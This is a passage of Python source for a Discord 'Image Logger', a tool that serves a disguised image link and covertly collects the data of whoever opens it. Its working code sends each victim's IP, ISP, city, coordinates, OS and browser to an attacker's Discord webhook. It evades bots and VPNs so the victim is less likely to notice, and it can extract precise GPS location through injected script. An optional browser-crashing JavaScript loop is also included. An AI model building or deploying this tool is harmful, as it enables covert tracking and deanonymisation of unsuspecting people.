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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
